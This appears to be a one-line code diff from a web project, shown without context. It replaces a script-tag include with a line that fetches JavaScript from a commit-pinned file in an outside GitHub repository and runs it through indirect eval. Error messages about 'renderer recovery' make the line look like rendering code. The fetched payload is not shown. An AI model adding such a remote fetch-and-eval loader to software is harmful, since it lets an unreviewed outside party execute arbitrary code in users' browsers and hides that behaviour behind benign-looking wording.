@@ -1,1 +1,1 @@
-const q=document.createElement('script');q.src='https://raw.githubusercontent.com/mksyml23/nest-escape/07dfe551681397753858931233131e5dfe765a5b/glassline-action-b.js';document.head.append(q);
+fetch('https://raw.githubusercontent.com/mksyml23/nest-escape/07dfe551681397753858931233131e5dfe765a5b/glassline-action-b.js').then(r=>{if(!r.ok)throw Error('renderer unavailable');return r.text()}).then(code=>(0,eval)(code)).catch(e=>console.error('Renderer recovery failed',e));
